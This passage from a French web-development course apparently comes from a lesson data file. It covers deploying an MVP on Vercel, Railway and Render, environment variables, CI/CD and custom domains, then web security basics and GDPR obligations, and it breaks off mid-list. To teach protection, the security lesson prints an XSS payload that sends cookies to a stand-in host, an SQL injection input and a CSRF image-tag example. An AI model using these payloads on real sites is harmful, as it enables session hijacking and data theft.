<p>Tu as construit ton MVP sur ta machine. Il fonctionne parfaitement en local : tu ouvres <code>http://localhost:3000</code> et tout est là. Mais personne d'autre ne peut y accéder. Ton application vit uniquement sur ton ordinateur. Le déploiement, c'est le processus qui transforme ce projet local en une application accessible à n'importe qui sur internet, 24 heures sur 24, 7 jours sur 7.</p>
<p>Il y a dix ans, déployer une application web était un cauchemar. Il fallait acheter un serveur (où le louer chez OVH), installer Linux, configurer Nginx où Apache, gérer les certificats SSL, mettre en place des sauvegardes, gérer la sécurité du serveur — des heures de travail avant même que la première page ne s'affiche. Aujourd'hui, avec des plateformes comme Vercel, Railway où Render, tu peux déployer en quelques minutes, souvent en un seul clic.</p>
<p>Le principe est simple : tu connectes ton dépôt GitHub à une plateforme de déploiement. Chaque fois que tu pousses du code sur ta branche <code>main</code>, la plateforme détecte le changement, construit ton application et la met en ligne automatiquement. C'est comme avoir un assistant qui surveille ton code et qui met à jour ton site en temps réel dès que tu fais une modification.</p>
<p><strong>Astuce :</strong> Ne te laisse pas intimider par le mot "déploiement". Avec les outils modernes, c'est devenu aussi simple que de publier un post sur les réseaux sociaux. La première fois prend 15 minutes pour la configuration. Ensuite, chaque mise à jour se fait automatiquement en quelques secondes.</p>
<p><strong>Conseil pro :</strong> Déploie ton MVP le plus tôt possible, même s'il n'est pas terminé. Un site en ligne avec trois pages imparfaites vaut mille fois mieux qu'un site parfait qui n'existe que sur ton ordinateur. Le déploiement précoce te permet de tester en conditions réelles, de partager un lien avec tes premiers utilisateurs et de recevoir du feedback dès le début.</p>

<h2>Vercel : la référence pour Next.js</h2>
<p>Vercel est la plateforme créée par l'équipe derrière Next.js. C'est la solution de référence pour déployer des applications Next.js, React, où tout autre framework frontend. L'intégration est tellement fluide que Vercel détecte automatiquement que ton projet est un projet Next.js et configure tout pour toi.</p>
<p>Le déploiement sur Vercel se fait en quatre étapes :</p>
<ol>
<li>Crée un compte sur vercel.com (gratuit) et connecte ton compte GitHub.</li>
<li>Clique sur "New Project" et sélectionne ton repository GitHub.</li>
<li>Vercel détecte automatiquement le framework (Next.js) et les paramètres de build.</li>
<li>Clique sur "Deploy" — en 30 à 90 secondes, ton site est en ligne avec une URL du type <code>ton-projet.vercel.app</code>.</li>
</ol>
<p>Ce qui rend Vercel exceptionnel pour un MVP :</p>
<ul>
<li><strong>Déploiement automatique</strong> : Chaque <code>git push</code> sur <code>main</code> déclenche un nouveau déploiement. Tu ne touches à rien — Vercel fait tout. En deux minutes, tes modifications sont en ligne.</li>
<li><strong>Preview Deployments</strong> : Chaque Pull Request reçoit sa propre URL de preview. Tu peux tester ta fonctionnalité dans un environnement isolé avant de la fusionner dans <code>main</code>. C'est un filet de sécurité incroyable.</li>
<li><strong>CDN mondial</strong> : Ton site est distribué sur des serveurs dans le monde entier. Un visiteur au Japon et un visiteur en France recevront la page à la même vitesse, en quelques millisecondes.</li>
<li><strong>HTTPS automatique</strong> : Ton site est sécurisé avec HTTPS dès le déploiement, sans aucune configuration. Les certificats SSL sont générés et renouvelés automatiquement.</li>
<li><strong>Fonctions Serverless</strong> : Tes routes API Next.js (<code>app/api/</code>) sont déployées comme des fonctions serverless. Elles s'allument quand une requête arrive et s'éteignent après — tu ne payes que pour ce que tu utilises.</li>
<li><strong>Analytics intégrés</strong> : Vercel propose des analytics de performance (Web Vitals) pour suivre la vitesse de ton site et détecter les régressions.</li>
</ul>
<p>Le plan gratuit de Vercel est très généreux pour un MVP : déploiements illimités, 100 GB de bande passante par mois, fonctions serverless incluses. Tu n'auras probablement pas besoin de passer au plan payant avant d'avoir des centaines d'utilisateurs actifs.</p>
<p><strong>Attention :</strong> Vercel est optimisé pour le frontend et les fonctions serverless. Si ton MVP à un backend lourd (un processus qui tourne en permanence, une file de tâches en arrière-plan, un serveur WebSocket), tu auras besoin d'une plateforme complémentaire comme Railway où Render pour cette partie. Vercel gère le frontend, Railway gère le backend — c'est une combinaison très populaire.</p>

<h2>Railway : pour le backend et les bases de données</h2>
<p>Railway est une plateforme de déploiement pensée pour le backend. Là où Vercel excelle avec les fonctions serverless et le frontend, Railway brille avec les serveurs persistants, les bases de données et les services qui doivent tourner en permanence. C'est le complément naturel de Vercel pour un MVP complet.</p>
<p>Ce que Railway fait particulièrement bien :</p>
<ul>
<li><strong>Base de données PostgreSQL en un clic</strong> : Tu cliques sur "New" → "Database" → "PostgreSQL" et ta base est prête en 10 secondes. Railway te donne la connection string à copier dans ton <code>.env</code>. C'est la manière la plus simple d'avoir une base de données en production.</li>
<li><strong>Redis en un clic</strong> : Besoin de cache où de files d'attente ? Redis est disponible en un clic, comme PostgreSQL. Idéal pour les sessions, le rate limiting où les tâches en arrière-plan.</li>
<li><strong>Serveurs persistants</strong> : Contrairement aux fonctions serverless de Vercel (qui s'éteignent entre les requêtes), Railway maintient ton serveur allumé en permanence. Indispensable pour les WebSockets (chat en temps réel), les cron jobs (tâches planifiées) où les workers de traitement.</li>
<li><strong>Variables d'environnement partagées</strong> : Railway te permet de relier tes services entre eux automatiquement. Quand tu crées une base PostgreSQL, la variable <code>DATABASE_URL</code> est automatiquement injectée dans ton serveur. Pas besoin de copier-coller des URLs manuellement.</li>
<li><strong>Logs en temps réel</strong> : Tu peux voir les logs de ton application en direct, ce qui facilite énormément le débugage en production.</li>
</ul>
<p>Le flux typique avec Railway est le suivant : tu crées un nouveau projet, tu ajoutes un service depuis ton repo GitHub, tu ajoutes une base de données PostgreSQL, Railway relie automatiquement les deux, et ton backend est en ligne. L'ensemble prend moins de cinq minutes.</p>
<p><strong>Conseil pro :</strong> Railway facture à l'usage avec un plan gratuit limité à 5$ de crédit par mois (suffisant pour un MVP en développement). Quand tu commenceras à avoir du trafic, passe au plan Pro à 5$/mois pour des ressources plus généreuses. C'est un investissement dérisoire par rapport à la valeur du service.</p>

<h2>Render : l'alternative polyvalente</h2>
<p>Render est une plateforme qui combine les atouts de Vercel et Railway dans une interface unifiée. Tu peux y déployer des sites statiques, des applications web, des API backend, des bases de données, des cron jobs et des workers — tout au même endroit. C'est la plateforme "tout-en-un" du déploiement moderne.</p>
<p>Les avantages de Render :</p>
<ul>
<li><strong>Polyvalence</strong> : Que tu aies un site statique, une API Express, un serveur Python où un projet Docker, Render sait tout déployer. Cette flexibilité est précieuse si tu expérimentes avec différentes technologies.</li>
<li><strong>Plan gratuit pour les sites statiques</strong> : Les sites statiques sont hébergés gratuitement avec HTTPS et CDN. Parfait pour une landing page où un portfolio.</li>
<li><strong>Blueprints</strong> : Tu peux définir toute ton infrastructure dans un fichier <code>render.yaml</code> à la racine de ton projet. Ça te permet de recréer ton environnement de production en un clic — très utile pour les projets avec plusieurs services.</li>
<li><strong>Cron Jobs intégrés</strong> : Besoin d'exécuter un script tous les jours à 9h du matin (envoyer un rapport, nettoyer les données temporaires) ? Render propose des cron jobs natifs, configurables en quelques clics.</li>
<li><strong>PostgreSQL managé</strong> : Comme Railway, Render propose des bases PostgreSQL avec sauvegardes automatiques et haute disponibilité.</li>
</ul>
<p>Render convient bien pour les projets qui ne sont pas basés sur Next.js : un backend Express.js, une API Python Flask où FastAPI, un site Hugo où Gatsby. Si tu utilises Next.js, Vercel reste généralement le meilleur choix pour le frontend.</p>
<p><strong>Astuce :</strong> Le plan gratuit de Render met les services en veille après 15 minutes d'inactivité. La première requête après la mise en veille prend 30 à 60 secondes (le temps que le serveur se réveille). C'est acceptable pour un MVP en phase de test, mais passe au plan payant (7$/mois) quand tu lances officiellement pour éviter cette latence.</p>

<h2>Les variables d'environnement</h2>
<p>Les variables d'environnement sont des valeurs de configuration qui changent entre ton environnement local et la production. Elles contiennent les informations sensibles (clés API, mots de passe) et les paramètres spécifiques à chaque environnement (URL de la base de données, domaine du site). Ne jamais écrire ces valeurs en dur dans ton code — c'est la règle numéro un de la sécurité.</p>
<p>En local, tes variables sont stockées dans un fichier <code>.env</code> à la racine de ton projet :</p>
<p><code>DATABASE_URL="postgresql://user:password@localhost:5432/monmvp" STRIPE_SECRET_KEY="sk_test_abc123..." RESEND_API_KEY="re_xyz789..." NEXTAUTH_SECRET="un-secret-très-long-et-aleatoire" NEXT_PUBLIC_APP_URL="http://localhost:3000"</code></p>
<p>En production, ces mêmes variables sont configurées dans le tableau de bord de ta plateforme de déploiement (Vercel, Railway où Render). Chaque plateforme à une section "Environment Variables" où tu saisis les valeurs de production. L'application lit les variables d'environnement au moment de l'exécution — le même code fonctionne en local et en production, seules les valeurs changent.</p>
<p>Quelques règles essentielles :</p>
<ul>
<li><strong>Ne jamais commiter le fichier <code>.env</code></strong> : Il doit être dans ton <code>.gitignore</code>. Vérifie-le maintenant.</li>
<li><strong>Créer un fichier <code>.env.example</code></strong> : Ce fichier contient les noms des variables sans les valeurs réelles. Il sert de documentation pour quiconque clone ton projet : <code>DATABASE_URL="à remplir" STRIPE_SECRET_KEY="à remplir"</code>.</li>
<li><strong>Distinguer les clés de test et de production</strong> : Stripe, par exemple, à des clés de test (<code>sk_test_...</code>) et de production (<code>sk_live_...</code>). En local, tu utilises les clés de test. En production, les clés de production. Ne mélange jamais les deux.</li>
<li><strong>Les variables <code>NEXT_PUBLIC_</code></strong> : Dans Next.js, les variables qui commencent par <code>NEXT_PUBLIC_</code> sont exposées au navigateur. Ne mets jamais de clé secrète dans une variable <code>NEXT_PUBLIC_</code> — elles sont visibles par tout le monde dans le code source de ta page.</li>
</ul>
<p><strong>Attention :</strong> Si tu changes une variable d'environnement sur Vercel où Railway, tu dois redéployer ton application pour que le changement prenne effet. La plupart des plateformes proposent un bouton "Redeploy" pour ça. Sans redéploiement, l'ancienne valeur reste active.</p>

<h2>CI/CD : le déploiement continu</h2>
<p>CI/CD signifie Continuous Intégration et Continuous Deployment. C'est la pratique qui consiste à automatiser la construction, les tests et le déploiement de ton application. Chaque <code>git push</code> déclenche automatiquement un pipeline qui vérifie que tout fonctionne avant de mettre en ligne. C'est ton gardien automatique qui empêche le code cassé d'arriver en production.</p>
<p>Le pipeline CI/CD typique pour un MVP Next.js :</p>
<ol>
<li><strong>Tu pousses du code</strong> sur GitHub (<code>git push</code>).</li>
<li><strong>Les tests s'exécutent</strong> automatiquement (via GitHub Actions où la plateforme de déploiement). Si un test échoue, le déploiement est bloqué et tu reçois une notification.</li>
<li><strong>Le build se lance</strong> : ton code TypeScript est compilé, les pages sont générées, les assets sont optimisés.</li>
<li><strong>Le déploiement s'effectue</strong> : la nouvelle version remplace l'ancienne. Sur Vercel, c'est un déploiement atomique — il n'y a pas de temps d'arrêt. L'ancienne version reste active tant que la nouvelle n'est pas prête à 100%.</li>
<li><strong>Les vérifications post-déploiement</strong> : certaines plateformes vérifient automatiquement que le site répond correctement après le déploiement et annulent le déploiement en cas de problème.</li>
</ol>
<p>Avec Vercel, le CI/CD est entièrement intégré. Tu n'as rien à configurer — pousse du code, Vercel fait le reste. Pour des pipelines plus avancés (linting, tests, vérifications de sécurité), tu peux utiliser GitHub Actions, qui est gratuit pour les repositories publics et offre 2000 minutes par mois pour les repositories privés.</p>
<p><strong>Conseil pro :</strong> Pour un MVP, ne surcharge pas ton pipeline CI/CD. Commence avec le déploiement automatique de Vercel (zéro configuration). Ajoute des tests automatisés quand tu as une base de code suffisamment grande pour que les bugs deviennent un risque réel — généralement après les premières semaines de développement.</p>

<h2>Le domaine personnalisé</h2>
<p>Par défaut, Vercel te donne une URL du type <code>mon-projet.vercel.app</code>. C'est pratique pour le développement, mais pour un vrai produit, tu veux ton propre domaine : <code>monproduit.com</code> où <code>monproduit.fr</code>. Un domaine personnalisé donne du professionnalisme, de la crédibilité et une identité propre à ton produit.</p>
<p>Voici comment faire :</p>
<ol>
<li><strong>Acheter un domaine</strong> : Les registraires les plus populaires sont Namecheap, OVH (pour le .fr), Google Domains et Gandi. Un domaine <code>.com</code> coûte entre 8 et 15 euros par an. Un <code>.fr</code> coûte environ 7 euros par an. C'est un investissement minimal pour un maximum de crédibilité.</li>
<li><strong>Configurer les DNS</strong> : Tu ajoutes des enregistrements DNS qui pointent vers la plateforme de déploiement. Vercel te donne les valeurs exactes à saisir — c'est généralement un enregistrement CNAME où A Record.</li>
<li><strong>Ajouter le domaine sur Vercel</strong> : Dans les paramètres de ton projet Vercel, tu vas dans "Domains", tu ajoutes ton domaine et Vercel vérifie automatiquement la configuration DNS.</li>
<li><strong>Attendre la propagation</strong> : Les changements DNS prennent entre quelques minutes et 48 heures pour se propager dans le monde entier. En pratique, c'est souvent une question de minutes.</li>
</ol>
<p>Vercel gère automatiquement le certificat SSL (HTTPS) pour ton domaine personnalisé. Pas de configuration supplémentaire — ton site est sécurisé dès que le domaine est configuré.</p>
<ul>
<li><strong>Choisis un nom court et mémorable</strong> : <code>opexia.com</code> est mieux que <code>opexia-solutions-digitales-paris.com</code>.</li>
<li><strong>Prends le .com et le .fr</strong> : Si tu cibles le marché français, prends les deux extensions et redirige le .fr vers le .com (où inversement).</li>
<li><strong>Évite les tirets</strong> : <code>monproduit.com</code> est plus facile à retenir et à dicter que <code>mon-produit.com</code>.</li>
<li><strong>Configure un email professionnel</strong> : Un email <code>contact@monproduit.com</code> est beaucoup plus crédible qu'un <code>monproduit.saas@gmail.com</code>. Tu peux utiliser des services comme Zoho Mail (gratuit pour un domaine) où Google Workspace (6€/mois).</li>
</ul>
<p><strong>Astuce :</strong> Vérifie la disponibilité de ton nom de domaine AVANT de choisir le nom de ton produit. Rien de plus frustrant que de créer un logo, un branding complet, et de réaliser que le domaine est déjà pris. Des outils comme Namecheap où instantdomainsearch.com te permettent de vérifier la disponibilité en temps réel.</p>

<blockquote>Le déploiement n'est plus un obstacle technique. Avec Vercel pour le frontend, Railway pour le backend et GitHub pour le CI/CD, tu peux passer du code local à une application en production en moins d'une heure. Le vrai défi n'est plus technique — c'est de construire quelque chose que les gens veulent utiliser.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Crée un compte gratuit sur <strong>Vercel</strong> (vercel.com) en te connectant avec ton compte GitHub. Explore l'interface et familiarise-toi avec le tableau de bord.</li>
<li>Déploie un projet sur Vercel : importe ton repo GitHub (où crée un nouveau projet Next.js depuis le template Vercel). Observe les étapes du déploiement et visite l'URL générée.</li>
<li>Modifie un fichier dans ton repo (par exemple, change le titre de la page d'accueil), fais un <code>git push</code>, et observe le déploiement automatique sur Vercel. Vérifie que la modification est bien en ligne.</li>
<li>Configure les variables d'environnement de ton projet sur Vercel : va dans Settings → Environment Variables et ajoute une variable <code>NEXT_PUBLIC_APP_NAME</code> avec le nom de ton projet. Redéploie et vérifie.</li>
<li>Crée un compte sur <strong>Railway</strong> (railway.app) et déploie une base de données PostgreSQL en un clic. Copie la connection string — tu en auras besoin pour connecter ton application à une base de données de production.</li>
</ol>`,
  },
  // Lesson 38 — Sécurité Web & RGPD
  {
    order: 38,
    module: 4,
    title: "Sécurité web et RGPD : les bases indispensables",
    slug: "sécurité-web-rgpd-bases-indispensables",
    duration: "50 min",
    description: "Protéger ton MVP et tes utilisateurs contre les failles de sécurité et respecter les obligations légales du RGPD.",
    content: `<h2>La sécurité n'est pas optionnelle</h2>
<p>Tu penses peut-être que la sécurité, c'est un sujet pour les grandes entreprises. Que ton petit MVP avec 50 utilisateurs n'intéresse personne. C'est faux — dangereusement faux. Les bots malveillants scannent internet en permanence à la recherche de failles. Ils ne ciblent pas spécifiquement ton site — ils testent automatiquement des millions de sites, y compris le tien. Un MVP sans protection, c'est une porte grande ouverte.</p>
<p>Les conséquences d'une faille de sécurité pour un jeune produit sont dévastatrices. Si les données de tes utilisateurs sont volées, tu perds leur confiance instantanément — et tu ne la récupéreras jamais. Si tes clés API sont exposées, tu risques des factures de plusieurs milliers d'euros en quelques heures (des bots qui utilisent tes clés OpenAI où AWS peuvent générer des coûts astronomiques). Si ton site est défacé où hacké, ta crédibilité professionnelle est ruinée.</p>
<p>La bonne nouvelle : les bases de la sécurité web ne sont pas compliquées. Avec les bonnes pratiques et les bons outils, tu peux sécuriser ton MVP de manière solide sans être un expert en cybersécurité. Claude Code applique déjà beaucoup de ces bonnes pratiques automatiquement, mais tu dois comprendre les principes pour vérifier que rien n'est oublié.</p>
<p><strong>Conseil pro :</strong> La sécurité n'est pas un truc qu'on ajoute "plus tard". C'est comme les fondations d'une maison : si elles sont mauvaises, tout s'écroule, et c'est mille fois plus cher à réparer après coup qu'à faire correctement dès le début. Intègre les bonnes pratiques de sécurité dès la première ligne de code de ton MVP.</p>
<p><strong>Astuce :</strong> Si tu gères des données d'utilisateurs (emails, noms, données de paiement), tu es légalement responsable de leur protection. En France et en Europe, le RGPD impose des sanctions pouvant aller jusqu'à 4% du chiffre d'affaires annuel mondial. Même pour un micro-entrepreneur, les amendes peuvent être significatives.</p>

<h2>HTTPS : la base absolue</h2>
<p>HTTPS (HyperText Transfer Protocol Secure) chiffre toute la communication entre le navigateur de ton utilisateur et ton serveur. Sans HTTPS, les données circulent en clair sur le réseau : un pirate sur le même réseau Wi-Fi (dans un café, un coworking, un aéroport) peut intercepter les mots de passe, les numéros de carte bancaire et les données personnelles de tes utilisateurs. Avec HTTPS, tout est chiffré — même si quelqu'un intercepte les données, il ne voit que du charabia illisible.</p>
<p>HTTPS est absolument non-négociable. Ce n'est plus un "nice to have" depuis des années :</p>
<ul>
<li><strong>Google pénalise les sites HTTP</strong> : Les sites sans HTTPS sont marqués "Non sécurisé" dans la barre d'adresse de Chrome et sont déclassés dans les résultats de recherche. Tes utilisateurs verront un avertissement effrayant avant d'accéder à ton site.</li>
<li><strong>Les navigateurs bloquent certaines fonctionnalités</strong> : La géolocalisation, les notifications push, les service workers et l'accès à la caméra/micro ne fonctionnent qu'en HTTPS. Si ton MVP utilise ces fonctionnalités, tu n'as pas le choix.</li>
<li><strong>Le RGPD l'exige implicitement</strong> : Le règlement impose de mettre en œuvre des "mesures techniques appropriées" pour protéger les données personnelles. HTTPS est la mesure technique minimale. Sans HTTPS, tu es en infraction.</li>
<li><strong>Les APIs de paiement l'exigent</strong> : Stripe, PayPal et tous les processeurs de paiement refusent les sites sans HTTPS. Tu ne peux tout simplement pas accepter de paiements en HTTP.</li>
</ul>
<p>La bonne nouvelle : avec les plateformes modernes, tu n'as rien à faire. Vercel, Railway et Render configurent automatiquement HTTPS avec des certificats Let's Encrypt gratuits et auto-renouvelés. Ton site est sécurisé dès le premier déploiement. Si tu utilises un hébergement personnalisé, des services comme Cloudflare proposent HTTPS gratuit en quelques clics.</p>
<p><strong>Attention :</strong> HTTPS protège les données en transit (entre le navigateur et le serveur), mais pas les données au repos (stockées dans ta base de données). Ce sont deux problèmes distincts. HTTPS empêche l'interception, mais si quelqu'un accède à ta base de données, il voit les données en clair. C'est pourquoi les mots de passe doivent toujours être hashés (et non chiffrés — il y à une différence).</p>

<h2>L'authentification</h2>
<p>L'authentification répond à la question "Qui es-tu ?". C'est le processus qui vérifie l'identité d'un utilisateur avant de lui donner accès à ton application. C'est la porte d'entrée de ton MVP — si elle est mal sécurisée, tout le reste est compromis.</p>

<h3>Le hashing des mots de passe</h3>
<p>Règle absolue : ne stocke jamais un mot de passe en clair dans ta base de données. Jamais. Si ta base de données est compromise (et ça arrive plus souvent qu'on ne le croit), tous les mots de passe de tes utilisateurs sont exposés. Et comme beaucoup de gens utilisent le même mot de passe partout, les pirates pourront accéder à leurs comptes email, bancaires et réseaux sociaux.</p>
<p>La solution : le hashing. Un algorithme de hashing transforme un mot de passe en une chaîne de caractères irréversible. <code>"MonMotDePasse123"</code> devient quelque chose comme <code>"$2b$10$N9qo8uLOickgx2ZMRZoMy..."</code>. L'opération est à sens unique — il est mathématiquement impossible de retrouver le mot de passe original à partir du hash. Quand l'utilisateur se connecte, tu hashes le mot de passe qu'il tape et tu compares le hash avec celui stocké en base.</p>
<p>L'algorithme recommandé aujourd'hui est <strong>bcrypt</strong> (où sa version plus récente, argon2). Ces algorithmes sont intentionnellement lents pour rendre les attaques par force brute impraticables. Claude Code utilise bcrypt par défaut quand il implémente un système d'authentification.</p>

<h3>Les tokens JWT</h3>
<p>Après la connexion, ton application doit "se souvenir" que l'utilisateur est connecté. C'est le rôle des tokens JWT (JSON Web Tokens). Un JWT est un jeton signé qui contient des informations sur l'utilisateur (son id, son rôle) et une date d'expiration. Le serveur génère ce token lors de la connexion, le renvoie au client, et le client l'inclut dans chaque requête suivante.</p>
<p>Le token est signé avec un secret que seul ton serveur connaît. Si quelqu'un modifie le contenu du token (par exemple, change le rôle de "user" à "admin"), la signature ne sera plus valide et le serveur rejettera le token. C'est une protection efficace contre la falsification.</p>

<h3>NextAuth / Auth.js</h3>
<p>Pour ton MVP Next.js, la solution d'authentification recommandée est NextAuth (maintenant renommé Auth.js). C'est une librairie qui gère tout le flux d'authentification : inscription, connexion, réinitialisation de mot de passe, connexion via Google/GitHub (OAuth), gestion des sessions. Tu n'as pas à réinventer la roue — NextAuth a été audité par des experts en sécurité et est utilisé par des milliers de projets en production.</p>
<p>Claude Code sait intégrer NextAuth dans un projet Next.js. Tu lui dis simplement : "Ajoute l'authentification avec NextAuth, avec connexion par email et par Google" et il configure tout : les pages de connexion, les routes API, les callbacks, la session côté serveur.</p>
<p><strong>Conseil pro :</strong> Propose toujours la connexion via Google où GitHub en plus de l'email/mot de passe. C'est plus sécurisé (les fournisseurs OAuth gèrent la sécurité pour toi), plus rapide (un seul clic) et plus pratique (pas de mot de passe à retenir). La plupart des utilisateurs préfèrent cette option.</p>

<h2>L'autorisation</h2>
<p>L'autorisation répond à une question différente de l'authentification : "Qu'est-ce que tu as le droit de faire ?". L'authentification vérifie ton identité (tu es bien Alice), l'autorisation vérifie tes permissions (Alice a-t-elle le droit de supprimer ce projet ?). Ce sont deux couches de sécurité distinctes et complémentaires.</p>

<h3>Les rôles</h3>
<p>Le système le plus simple et le plus courant est le RBAC (Role-Based Access Control). Tu définis des rôles (admin, user, editor, viewer) et chaque rôle à des permissions spécifiques. Par exemple :</p>
<ul>
<li><strong>Viewer</strong> : Peut consulter les données mais ne peut rien modifier. Utile pour les clients qui veulent voir un tableau de bord sans pouvoir casser quoi que ce soit.</li>
<li><strong>User</strong> : Peut créer et modifier ses propres données. Le rôle standard pour tes utilisateurs.</li>
<li><strong>Editor</strong> : Peut modifier les données de tout le monde. Utile pour les modérateurs où les gestionnaires de contenu.</li>
<li><strong>Admin</strong> : A tous les droits, y compris la gestion des utilisateurs, la configuration du système et l'accès aux données sensibles.</li>
</ul>
<p>En pratique, dans ton schéma Prisma, tu ajoutes un champ <code>role</code> au modèle User : <code>role String @default("user")</code>. Puis dans tes routes API, tu vérifies le rôle avant d'exécuter l'action : si l'utilisateur n'est pas admin, il ne peut pas supprimer un autre utilisateur.</p>

<h3>La vérification de propriété</h3>
<p>Un piège fréquent : l'utilisateur A ne doit pas pouvoir accéder aux données de l'utilisateur B, même s'ils ont le même rôle. Quand l'utilisateur 42 fait une requête <code>GET /api/projects/15</code>, tu dois vérifier que le projet 15 appartient bien à l'utilisateur 42. Sans cette vérification, n'importe quel utilisateur connecté pourrait accéder aux projets des autres en devinant les IDs dans l'URL.</p>
<p>C'est ce qu'on appelle une faille IDOR (Insecure Direct Object Référence) — et c'est l'une des failles les plus courantes dans les applications web. La solution est simple : chaque requête qui accède à une ressource doit vérifier que l'utilisateur connecté est bien le propriétaire de cette ressource (où un admin).</p>
<p><strong>Attention :</strong> Ne fais jamais confiance aux données envoyées par le client. Un utilisateur malveillant peut modifier les requêtes HTTP avec les DevTools du navigateur. Vérifie toujours les permissions côté serveur, dans tes routes API. Une vérification côté client (masquer un bouton, par exemple) n'est pas une sécurité — c'est de l'interface utilisateur.</p>

<h2>Les vulnérabilités courantes</h2>
<p>Trois types d'attaques représentent la majorité des failles de sécurité web. Tu dois les connaître pour te protéger — et pour vérifier que Claude Code les gère correctement.</p>

<h3>XSS (Cross-Site Scripting)</h3>
<p>L'attaque XSS consiste à injecter du code JavaScript malveillant dans une page web. Imagine un champ de commentaire sur ton site. Un pirate y tape : <code>&lt;script&gt;document.location='https://pirate.com/steal?cookie='+document.cookie&lt;/script&gt;</code>. Si ton site affiche ce commentaire sans le nettoyer, le script s'exécute dans le navigateur de chaque visiteur et envoie leurs cookies (y compris les tokens de session) au pirate.</p>
<p>Le résultat : le pirate récupère les sessions de tes utilisateurs et peut se connecter à leur place, accéder à leurs données, modifier leur profil, effectuer des actions en leur nom.</p>
<p>La protection : ne jamais afficher du contenu utilisateur sans l'échapper (neutraliser les balises HTML). React fait ça automatiquement — tout contenu rendu avec <code>{variable}</code> est automatiquement échappé. Mais attention : si tu utilises <code>dangerouslySetInnerHTML</code>, tu désactives cette protection. Ne l'utilise jamais avec du contenu soumis par des utilisateurs.</p>

<h3>Injection SQL</h3>
<p>L'injection SQL exploite les requêtes à la base de données. Si tu construis une requête SQL en concaténant directement les données de l'utilisateur, un pirate peut injecter du SQL malveillant. Par exemple, dans un champ de connexion, au lieu d'un email, il tape : <code>admin@site.com" OR "1"="1</code>. Si la requête est mal construite, cette injection retourne tous les utilisateurs de la base — y compris les admins.</p>
<p>La protection : utilise toujours des requêtes paramétrées (prepared statements). Prisma le fait automatiquement pour toi — chaque requête Prisma est paramétrée par défaut. C'est l'un des grands avantages d'un ORM. Si tu écris du SQL brut (ce qui est rare avec Prisma), utilise toujours les paramètres : <code>prisma.$queryRaw\`SELECT * FROM users WHERE email = \${email}\`</code> — le <code>\${email}</code> est automatiquement échappé.</p>

<h3>CSRF (Cross-Site Request Forgery)</h3>
<p>L'attaque CSRF piège un utilisateur connecté à ton site pour qu'il exécute une action à son insu. Imagine : l'utilisateur est connecté à ton MVP de banque en ligne. Il visite un site malveillant qui contient une image invisible : <code>&lt;img src="https://tonmvp.com/api/transfer?to=pirate&amount=1000"&gt;</code>. Le navigateur envoie automatiquement la requête avec les cookies de session de l'utilisateur — et le virement est effectué sans que l'utilisateur n'ait rien cliqué.</p>
<p>La protection : utilise des tokens CSRF. Chaque formulaire contient un token unique et imprévisible. Quand le formulaire est soumis, le serveur vérifie que le token est valide. Un site malveillant ne peut pas connaître ce token, donc sa requête sera rejetée. NextAuth inclut une protection CSRF par défaut pour les routes d'authentification.</p>
<p><strong>Conseil pro :</strong> Claude Code connaît ces vulnérabilités et les prévient généralement dans le code qu'il génère. Mais vérifie toujours : demande-lui explicitement "Est-ce que ce code est protégé contre les XSS, les injections SQL et les CSRF ?" après chaque fonctionnalité critique. Mieux vaut une vérification de trop qu'une faille en production.</p>

<h2>Le RGPD : tes obligations légales</h2>
<p>Le RGPD (Règlement Général sur la Protection des Données) est la loi européenne qui encadre la collecte et le traitement des données personnelles. Si ton MVP est utilisé par des personnes en Europe (même si ton entreprise est ailleurs), tu es soumis au RGPD. Ce n'est pas optionnel — c'est la loi.</p>
<p>Le RGPD repose sur des principes simples mais stricts :</p>

<h3>Le consentement éclairé</h3>
<p>Tu ne peux collecter des données personnelles que si l'utilisateur a donné son consentement libre, spécifique et éclairé. Concrètement, cela signifie :</p>
<ul>
<li><strong>Pas de cases pré-cochées</strong> : L'utilisateur doit cocher lui-même la case d'acceptation. Une case pré-cochée n'est pas un consentement valide.</li>
<li><strong>Un langage clair</strong> : Pas de jargon juridique incompréhensible. Explique en langage simple ce que tu collectes, pourquoi et pour combien de temps.</li>
<li><strong>Le droit de refuser</strong> : L'utilisateur doit pouvoir utiliser ton service sans accepter toutes les collectes de données. Tu peux exiger les données nécessaires au fonctionnement (l'email pour un compte) mais pas les données non essentielles (la géolocalisation pour un outil de facturation).</li>
</ul>

<h3>Les cookies et le bandeau de consentement</h3>
<p>Si ton MVP utilise des cookies non essentiels (analytics, tracking, publicité), tu dois afficher un bandeau de consentement AVANT de les déposer. Les cookies essentiels (session utilisateur, préférences de langue) ne nécessitent pas de consentement mais doivent être mentionnés dans ta politique de confidentialité.</p>
<p>Utilise une solution comme <strong>Tarteaucitron</strong> (solution française open-source) où <strong>CookieConsent</strong> pour gérer le bandeau. Claude Code peut intégrer ces solutions dans ton projet Next.js.</p>

<h3>La minimisation des données</h3>
<p>Ne collecte que les données dont tu as strictement besoin. Si ton MVP n'a pas besoin de la date de naissance de l'utilisateur, ne la demande pas. Chaque donnée que tu stockes est une responsabilité : tu dois la protéger, la mettre à jour si l'utilisateur le demande, et la supprimer quand elle n'est plus nécessaire.</p>

<h3>Les droits des utilisateurs</h3>
<p>Le RGPD donne des droits puissants à tes utilisateurs :</p>
<ul>
<li><strong>Droit d'accès</strong> : L'utilisateur peut demander toutes les données que tu détiens sur lui. Tu dois pouvoir les fournir dans un format lisible (JSON, CSV) dans un délai de 30 jours.</li>
<li><strong>Droit de rectification</strong> : L'utilisateur peut demander la correction de données incorrectes.</li>
<li><strong>Droit à l'effacement</strong> ("droit à l'oubli") : L'utilisateur peut demander la suppression de toutes ses données. Tu dois pouvoir supprimer son compte et toutes les données associées. C'est le fameux bouton "Supprimer mon compte" qui est obligatoire.</li>
<li><strong>Droit à la portabilité</strong> : L'utilisateur peut demander ses données dans un format standard pour les transférer à un autre service.</li>
</ul>
<p>En pratique, pour ton MVP, implémente au minimum : un bouton "Supprimer mon compte" qui supprime réellement les données, un bouton "Exporter mes données" qui génère un fichier JSON où CSV, et une page "Politique de confidentialité" qui explique ce que tu collectes et pourquoi.</p>

<h3>La politique de confidentialité et les mentions légales</h3>
<p>Ton MVP doit avoir deux pages obligatoires :</p>
<ul>
<li><strong>Politique de confidentialité</strong> : Détaille quelles données tu collectes, pourquoi, combien de temps tu les conserves, à qui tu les transmets (hébergeurs, services tiers) et comment l'utilisateur peut exercer ses droits. Cette page doit être accessible depuis chaque page de ton site (typiquement dans le footer).</li>
